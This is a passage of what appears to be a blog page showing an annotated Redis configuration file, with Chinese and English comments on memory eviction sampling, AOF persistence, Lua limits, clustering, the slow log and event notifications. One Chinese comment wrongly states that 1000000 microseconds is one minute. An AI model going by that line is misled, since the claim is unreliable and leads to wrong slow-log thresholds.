volatile-lru</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># LRU &#x548C; minimal TTL &#x7B97;&#x6CD5;&#x90FD;&#x4E0D;&#x662F;&#x7CBE;&#x51C6;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x76F8;&#x5BF9;&#x7CBE;&#x786E;&#x7684;&#x7B97;&#x6CD5;(&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x5185;&#x5B58;)&#xFF0C;&#x968F;&#x610F;&#x4F60;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x6837;&#x672C;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># Redis&#x9ED8;&#x8BA4;&#x7684;&#x7070;&#x9009;&#x62E9;3&#x4E2A;&#x6837;&#x672C;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;maxmemory-samples&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># maxmemory-samples 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#################################### AOF ####################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;redis&#x4F1A;&#x5728;&#x540E;&#x53F0;&#x5F02;&#x6B65;&#x7684;&#x628A;&#x6570;&#x636E;&#x5E93;&#x955C;&#x50CF;&#x5907;&#x4EFD;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x4F46;&#x662F;&#x8BE5;&#x5907;&#x4EFD;&#x662F;&#x975E;&#x5E38;&#x8017;&#x65F6;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5907;&#x4EFD;&#x4E5F;&#x4E0D;&#x80FD;&#x5F88;&#x9891;&#x7E41;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x751F;&#x8BF8;&#x5982;&#x62C9;&#x95F8;&#x9650;&#x7535;&#x3001;&#x62D4;&#x63D2;&#x5934;&#x7B49;&#x72B6;&#x51B5;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x9020;&#x6210;&#x6BD4;&#x8F83;&#x5927;&#x8303;&#x56F4;&#x7684;&#x6570;&#x636E;&#x4E22;&#x5931;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6240;&#x4EE5;redis&#x63D0;&#x4F9B;&#x4E86;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5907;&#x4EFD;&#x53CA;&#x707E;&#x96BE;&#x6062;&#x590D;&#x65B9;&#x5F0F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F00;&#x542F;append only&#x6A21;&#x5F0F;&#x4E4B;&#x540E;&#xFF0C;redis&#x4F1A;&#x628A;&#x6240;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x5199;&#x64CD;&#x4F5C;&#x8BF7;&#x6C42;&#x90FD;&#x8FFD;&#x52A0;&#x5230;appendonly.aof&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x5F53;redis&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x4F1A;&#x4ECE;&#x8BE5;&#x6587;&#x4EF6;&#x6062;&#x590D;&#x51FA;&#x4E4B;&#x524D;&#x7684;&#x72B6;&#x6001;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F;&#x8FD9;&#x6837;&#x4F1A;&#x9020;&#x6210;appendonly.aof&#x6587;&#x4EF6;&#x8FC7;&#x5927;&#xFF0C;&#x6240;&#x4EE5;redis&#x8FD8;&#x652F;&#x6301;&#x4E86;BGREWRITEAOF&#x6307;&#x4EE4;&#xFF0C;&#x5BF9;appendonly.aof &#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x6574;&#x7406;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x5F00;&#x542F;asynchronous dumps &#x548C; AOF</span></span><br><span class=\"line\"> </span><br><span class=\"line\">appendonly no</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># AOF&#x6587;&#x4EF6;&#x540D;&#x79F0; (&#x9ED8;&#x8BA4;: &quot;appendonly.aof&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># appendfilename appendonly.aof</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis&#x652F;&#x6301;&#x4E09;&#x79CD;&#x540C;&#x6B65;AOF&#x6587;&#x4EF6;&#x7684;&#x7B56;&#x7565;:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># no: &#x4E0D;&#x8FDB;&#x884C;&#x540C;&#x6B65;&#xFF0C;&#x7CFB;&#x7EDF;&#x53BB;&#x64CD;&#x4F5C; . Faster.</span></span><br><span class=\"line\"><span class=\"comment\"># always: always&#x8868;&#x793A;&#x6BCF;&#x6B21;&#x6709;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x8FDB;&#x884C;&#x540C;&#x6B65;. Slow, Safest.</span></span><br><span class=\"line\"><span class=\"comment\"># everysec: &#x8868;&#x793A;&#x5BF9;&#x5199;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x7D2F;&#x79EF;&#xFF0C;&#x6BCF;&#x79D2;&#x540C;&#x6B65;&#x4E00;&#x6B21;. Compromise.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x662F;&quot;everysec&quot;&#xFF0C;&#x6309;&#x7167;&#x901F;&#x5EA6;&#x548C;&#x5B89;&#x5168;&#x6298;&#x4E2D;&#x8FD9;&#x662F;&#x6700;&#x597D;&#x7684;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x60F3;&#x8BA9;Redis&#x80FD;&#x66F4;&#x9AD8;&#x6548;&#x7684;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;&quot;no&quot;&#xFF0C;&#x8BA9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x51B3;&#x5B9A;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x53BB;&#x6267;&#x884C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6216;&#x8005;&#x76F8;&#x53CD;&#x60F3;&#x8BA9;&#x6570;&#x636E;&#x66F4;&#x5B89;&#x5168;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;&quot;always&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4E0D;&#x786E;&#x5B9A;&#x5C31;&#x7528; &quot;everysec&quot;.</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># appendfsync always</span></span><br><span class=\"line\">appendfsync everysec</span><br><span class=\"line\"><span class=\"comment\"># appendfsync no</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># AOF&#x7B56;&#x7565;&#x8BBE;&#x7F6E;&#x4E3A;always&#x6216;&#x8005;everysec&#x65F6;&#xFF0C;&#x540E;&#x53F0;&#x5904;&#x7406;&#x8FDB;&#x7A0B;(&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x6216;&#x8005;AOF&#x65E5;&#x5FD7;&#x91CD;&#x5199;)&#x4F1A;&#x6267;&#x884C;&#x5927;&#x91CF;&#x7684;I/O&#x64CD;&#x4F5C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x67D0;&#x4E9B;Linux&#x914D;&#x7F6E;&#x4E2D;&#x4F1A;&#x963B;&#x6B62;&#x8FC7;&#x957F;&#x7684;fsync()&#x8BF7;&#x6C42;&#x3002;&#x6CE8;&#x610F;&#x73B0;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4FEE;&#x590D;&#xFF0C;&#x5373;&#x4F7F;fsync&#x5728;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x8FDB;&#x884C;&#x5904;&#x7406;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E3A;&#x4E86;&#x51CF;&#x7F13;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;no-appendfsync-on-rewrite</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># This means that while another child is saving the durability of Redis is</span></span><br><span class=\"line\"><span class=\"comment\"># the same as &quot;appendfsync none&quot;, that in pratical terms means that it is</span></span><br><span class=\"line\"><span class=\"comment\"># possible to lost up to 30 seconds of log in the worst scenario (with the</span></span><br><span class=\"line\"><span class=\"comment\"># default Linux settings).</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as</span></span><br><span class=\"line\"><span class=\"comment\"># &quot;no&quot; that is the safest pick from the point of view of durability.</span></span><br><span class=\"line\">no-appendfsync-on-rewrite no</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Automatic rewrite of the append only file.</span></span><br><span class=\"line\"><span class=\"comment\"># AOF &#x81EA;&#x52A8;&#x91CD;&#x5199;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;AOF&#x6587;&#x4EF6;&#x589E;&#x957F;&#x5230;&#x4E00;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x65F6;&#x5019;Redis&#x80FD;&#x591F;&#x8C03;&#x7528; BGREWRITEAOF &#x5BF9;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x91CD;&#x5199; </span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x5B83;&#x662F;&#x8FD9;&#x6837;&#x5DE5;&#x4F5C;&#x7684;&#xFF1A;Redis&#x4F1A;&#x8BB0;&#x4F4F;&#x4E0A;&#x6B21;&#x8FDB;&#x884C;&#x4E9B;&#x65E5;&#x5FD7;&#x540E;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;(&#x5982;&#x679C;&#x4ECE;&#x5F00;&#x673A;&#x4EE5;&#x6765;&#x8FD8;&#x6CA1;&#x8FDB;&#x884C;&#x8FC7;&#x91CD;&#x5199;&#xFF0C;&#x90A3;&#x65E5;&#x5B50;&#x5927;&#x5C0F;&#x5728;&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x786E;&#x5B9A;)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x57FA;&#x7840;&#x5927;&#x5C0F;&#x4F1A;&#x540C;&#x73B0;&#x5728;&#x7684;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x3002;&#x5982;&#x679C;&#x73B0;&#x5728;&#x7684;&#x5927;&#x5C0F;&#x6BD4;&#x57FA;&#x7840;&#x5927;&#x5C0F;&#x5927;&#x5236;&#x5B9A;&#x7684;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x91CD;&#x5199;&#x529F;&#x80FD;&#x5C06;&#x542F;&#x52A8;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x540C;&#x65F6;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x6700;&#x5C0F;&#x5927;&#x5C0F;&#x7528;&#x4E8E;AOF&#x91CD;&#x5199;&#xFF0C;&#x8FD9;&#x4E2A;&#x7528;&#x4E8E;&#x963B;&#x6B62;&#x5373;&#x4F7F;&#x6587;&#x4EF6;&#x5F88;&#x5C0F;&#x4F46;&#x662F;&#x589E;&#x957F;&#x5E45;&#x5EA6;&#x5F88;&#x5927;&#x4E5F;&#x53BB;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x60C5;&#x51B5;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E; percentage &#x4E3A;0&#x5C31;&#x5173;&#x95ED;&#x8FD9;&#x4E2A;&#x7279;&#x6027;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">auto-aof-rewrite-percentage 100</span><br><span class=\"line\">auto-aof-rewrite-min-size 64mb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">############################## LUA SCRIPTING  ###############################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Max execution time of a Lua script in milliseconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># If the maximum execution time is reached Redis will log that a script is</span></span><br><span class=\"line\"><span class=\"comment\"># still in execution after the maximum allowed time and will start to</span></span><br><span class=\"line\"><span class=\"comment\"># reply to queries with an error.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># When a long running script exceed the maximum execution time only the</span></span><br><span class=\"line\"><span class=\"comment\"># SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be</span></span><br><span class=\"line\"><span class=\"comment\"># used to stop a script that did not yet called write commands. The second</span></span><br><span class=\"line\"><span class=\"comment\"># is the only way to shut down the server in the case a write commands was</span></span><br><span class=\"line\"><span class=\"comment\"># already issue by the script but the user don&apos;t want to wait for the natural</span></span><br><span class=\"line\"><span class=\"comment\"># termination of the script.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Set it to 0 or a negative value for unlimited execution without warnings.</span></span><br><span class=\"line\">lua-time-limit 5000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ REDIS &#x96C6;&#x7FA4;  ###############################</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x542F;&#x7528;&#x6216;&#x505C;&#x7528;&#x96C6;&#x7FA4;</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-enabled yes</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Every cluster node has a cluster configuration file. This file is not</span></span><br><span class=\"line\"><span class=\"comment\"># intended to be edited by hand. It is created and updated by Redis nodes.</span></span><br><span class=\"line\"><span class=\"comment\"># Every Redis Cluster node requires a different cluster configuration file.</span></span><br><span class=\"line\"><span class=\"comment\"># Make sure that instances running in the same system does not have</span></span><br><span class=\"line\"><span class=\"comment\"># overlapping cluster configuration file names.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-config-file nodes-6379.conf</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Cluster node timeout is the amount of milliseconds a node must be unreachable </span></span><br><span class=\"line\"><span class=\"comment\"># for it to be considered in failure state.</span></span><br><span class=\"line\"><span class=\"comment\"># Most other internal time limits are multiple of the node timeout.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-node-timeout 15000</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># A slave of a failing master will avoid to start a failover if its data</span></span><br><span class=\"line\"><span class=\"comment\"># looks too old.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># There is no simple way for a slave to actually have a exact measure of</span></span><br><span class=\"line\"><span class=\"comment\"># its &quot;data age&quot;, so the following two checks are performed:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1) If there are multiple slaves able to failover, they exchange messages</span></span><br><span class=\"line\"><span class=\"comment\">#    in order to try to give an advantage to the slave with the best</span></span><br><span class=\"line\"><span class=\"comment\">#    replication offset (more data from the master processed).</span></span><br><span class=\"line\"><span class=\"comment\">#    Slaves will try to get their rank by offset, and apply to the start</span></span><br><span class=\"line\"><span class=\"comment\">#    of the failover a delay proportional to their rank.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 2) Every single slave computes the time of the last interaction with</span></span><br><span class=\"line\"><span class=\"comment\">#    its master. This can be the last ping or command received (if the master</span></span><br><span class=\"line\"><span class=\"comment\">#    is still in the &quot;connected&quot; state), or the time that elapsed since the</span></span><br><span class=\"line\"><span class=\"comment\">#    disconnection with the master (if the replication link is currently down).</span></span><br><span class=\"line\"><span class=\"comment\">#    If the last interaction is too old, the slave will not try to failover</span></span><br><span class=\"line\"><span class=\"comment\">#    at all.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The point &quot;2&quot; can be tuned by user. Specifically a slave will not perform</span></span><br><span class=\"line\"><span class=\"comment\"># the failover if, since the last interaction with the master, the time</span></span><br><span class=\"line\"><span class=\"comment\"># elapsed is greater than:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#   (node-timeout * slave-validity-factor) + repl-ping-slave-period</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># So for example if node-timeout is 30 seconds, and the slave-validity-factor</span></span><br><span class=\"line\"><span class=\"comment\"># is 10, and assuming a default repl-ping-slave-period of 10 seconds, the</span></span><br><span class=\"line\"><span class=\"comment\"># slave will not try to failover if it was not able to talk with the master</span></span><br><span class=\"line\"><span class=\"comment\"># for longer than 310 seconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A large slave-validity-factor may allow slaves with too old data to failover</span></span><br><span class=\"line\"><span class=\"comment\"># a master, while a too small value may prevent the cluster from being able to</span></span><br><span class=\"line\"><span class=\"comment\"># elect a slave at all.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For maximum availability, it is possible to set the slave-validity-factor</span></span><br><span class=\"line\"><span class=\"comment\"># to a value of 0, which means, that slaves will always try to failover the</span></span><br><span class=\"line\"><span class=\"comment\"># master regardless of the last time they interacted with the master.</span></span><br><span class=\"line\"><span class=\"comment\"># (However they&apos;ll always try to apply a delay proportional to their</span></span><br><span class=\"line\"><span class=\"comment\"># offset rank).</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Zero is the only value able to guarantee that when all the partitions heal</span></span><br><span class=\"line\"><span class=\"comment\"># the cluster will always be able to continue.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-slave-validity-factor 10</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Cluster slaves are able to migrate to orphaned masters, that are masters</span></span><br><span class=\"line\"><span class=\"comment\"># that are left without working slaves. This improves the cluster ability</span></span><br><span class=\"line\"><span class=\"comment\"># to resist to failures as otherwise an orphaned master can&apos;t be failed over</span></span><br><span class=\"line\"><span class=\"comment\"># in case of failure if it has no working slaves.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Slaves migrate to orphaned masters only if there are still at least a</span></span><br><span class=\"line\"><span class=\"comment\"># given number of other working slaves for their old master. This number</span></span><br><span class=\"line\"><span class=\"comment\"># is the &quot;migration barrier&quot;. A migration barrier of 1 means that a slave</span></span><br><span class=\"line\"><span class=\"comment\"># will migrate only if there is at least 1 other working slave for its master</span></span><br><span class=\"line\"><span class=\"comment\"># and so forth. It usually reflects the number of slaves you want for every</span></span><br><span class=\"line\"><span class=\"comment\"># master in your cluster.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Default is 1 (slaves migrate only if their masters remain with at least</span></span><br><span class=\"line\"><span class=\"comment\"># one slave). To disable migration just set it to a very large value.</span></span><br><span class=\"line\"><span class=\"comment\"># A value of 0 can be set but is useful only for debugging and dangerous</span></span><br><span class=\"line\"><span class=\"comment\"># in production.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-migration-barrier 1</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># In order to setup your cluster make sure to read the documentation</span></span><br><span class=\"line\"><span class=\"comment\"># available at http://redis.io web site.</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################## SLOW LOG ###################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis Slow Log &#x8BB0;&#x5F55;&#x8D85;&#x8FC7;&#x7279;&#x5B9A;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x5305;&#x62EC;I/O&#x8BA1;&#x7B97;&#x6BD4;&#x5982;&#x8FDE;&#x63A5;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7B49;&#xFF0C;&#x53EA;&#x662F;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x65F6;&#x95F4;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;slow log&#xFF1A;&#x4E00;&#x4E2A;&#x662F;&#x544A;&#x8BC9;Redis&#x6267;&#x884C;&#x8D85;&#x8FC7;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#x88AB;&#x8BB0;&#x5F55;&#x7684;&#x53C2;&#x6570;slowlog-log-slower-than(&#x5FAE;&#x5999;)&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x53E6;&#x4E00;&#x4E2A;&#x662F;slow log &#x7684;&#x957F;&#x5EA6;&#x3002;&#x5F53;&#x4E00;&#x4E2A;&#x65B0;&#x547D;&#x4EE4;&#x88AB;&#x8BB0;&#x5F55;&#x7684;&#x65F6;&#x5019;&#x6700;&#x65E9;&#x7684;&#x547D;&#x4EE4;&#x5C06;&#x88AB;&#x4ECE;&#x961F;&#x5217;&#x4E2D;&#x79FB;&#x9664;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x4E0B;&#x9762;&#x7684;&#x65F6;&#x95F4;&#x4EE5;&#x5FAE;&#x5999;&#x5FAE;&#x5355;&#x4F4D;&#xFF0C;&#x56E0;&#x6B64;1000000&#x4EE3;&#x8868;&#x4E00;&#x5206;&#x949F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#x5236;&#x5B9A;&#x4E00;&#x4E2A;&#x8D1F;&#x6570;&#x5C06;&#x5173;&#x95ED;&#x6162;&#x65E5;&#x5FD7;&#xFF0C;&#x800C;&#x8BBE;&#x7F6E;&#x4E3A;0&#x5C06;&#x5F3A;&#x5236;&#x6BCF;&#x4E2A;&#x547D;&#x4EE4;&#x90FD;&#x4F1A;&#x8BB0;&#x5F55;</span></span><br><span class=\"line\">slowlog-log-slower-than 10000</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5BF9;&#x65E5;&#x5FD7;&#x957F;&#x5EA6;&#x6CA1;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x53EA;&#x662F;&#x8981;&#x6CE8;&#x610F;&#x5B83;&#x4F1A;&#x6D88;&#x8017;&#x5185;&#x5B58;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x53EF;&#x4EE5;&#x901A;&#x8FC7; SLOWLOG RESET &#x56DE;&#x6536;&#x88AB;&#x6162;&#x65E5;&#x5FD7;&#x6D88;&#x8017;&#x7684;&#x5185;&#x5B58;</span></span><br><span class=\"line\">slowlog-max-len 102</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">############################# Event notification ##############################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis can notify Pub/Sub clients about events happening in the key space.</span></span><br><span class=\"line\"><span class=\"comment\"># This feature is documented at http://redis.io/topics/keyspace-events</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># For instance if keyspace events notification is enabled, and a client</span></span><br><span class=\"line\"><span class=\"comment\"># performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two</span></span><br><span class=\"line\"><span class=\"comment\"># messages will be published via Pub/Sub:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># PUBLISH __keyspace@0__:foo del</span></span><br><span class=\"line\"><span class=\"comment\"># PUBLISH __keyevent@0__:del foo</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># It is possible to select the events that Redis will notify among a set</span></span><br><span class=\"line\"><span class=\"comment\"># of classes. Every class is identified by a single character:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  K     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.</span></span><br><span class=\"line\"><span class=\"comment\">#  E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.</span></span><br><span class=\"line\"><span class=\"comment\">#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...</span></span><br><span class=\"line\"><span class=\"comment\">#  $     String commands</span></span><br><span class=\"line\"><span class=\"comment\">#  l     List commands</span></span><br><span class=\"line\"><span class=\"comment\">#  s     Set commands</span></span><br><span class=\"line\"><span class=\"comment\">#  h     Hash commands</span></span><br><span class=\"line\"><span class=\"comment\">#  z     Sorted set commands</span></span><br><span class=\"line\"><span class=\"comment\">#  x     Expired events (events generated every time a key expires)</span></span><br><span class=\"line\"><span class=\"comment\">#  e     Evicted events (events generated when a key is evicted for maxmemory)</span></span><br><span class=\"line\"><span class=\"comment\">#  A     Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  The &quot;notify-keyspace-events&quot; takes as argument a string that is composed</span></span><br><span class=\"line\"><span class=\"comment\">#  by zero or multiple characters. The empty string means that notifications</span></span><br><span class=\"line\"><span class=\"comment\">#  are disabled at all.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  Example: to enable list and generic events, from the point of view of the</span></span><br><span class=\"line\"><span class=\"comment\">#           event name, use:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  notify-keyspace-events Elg</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  Example 2: to get the stream of the expired keys subscribing to channel</span></span><br><span class=\"line\"><span class=\"comment\">#             name __keyevent@0__:expired use:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  notify-keyspace-events Ex</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  By default all notifications are disabled because most users don&apos;t need</span></span><br><span class=\"line\"><span class=\"comment\">#  this feature and the feature has some overhead. Note that if you don&apos;t</span></span><br><span class=\"line\"><span class=\"comment\">#  specify at least one of K or E, no events will be delivered.</span></span><br><span class=\"line\">notify-keyspace-events <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">############################### ADVANCED CONFIG ###############################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;hash&#x4E2D;&#x5305;&#x542B;&#x8D85;&#x8FC7;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x4E2A;&#x6570;&#x5E76;&#x4E14;&#x6700;&#x5927;&#x7684;&#x5143;&#x7D20;&#x6CA1;&#x6709;&#x8D85;&#x8FC7;&#x4E34;&#x754C;&#x65F6;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># hash&#x5C06;&#x4EE5;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#xFF08;&#x5927;&#x5927;&#x51CF;&#x5C11;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#xFF09;&#x6765;&#x5B58;&#x50A8;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8FD9;&#x4E24;&#x4E2A;&#x4E34;&#x754C;&#x503C;</span></span><br><span class=\"line\"><span class=\"comment\"># Redis 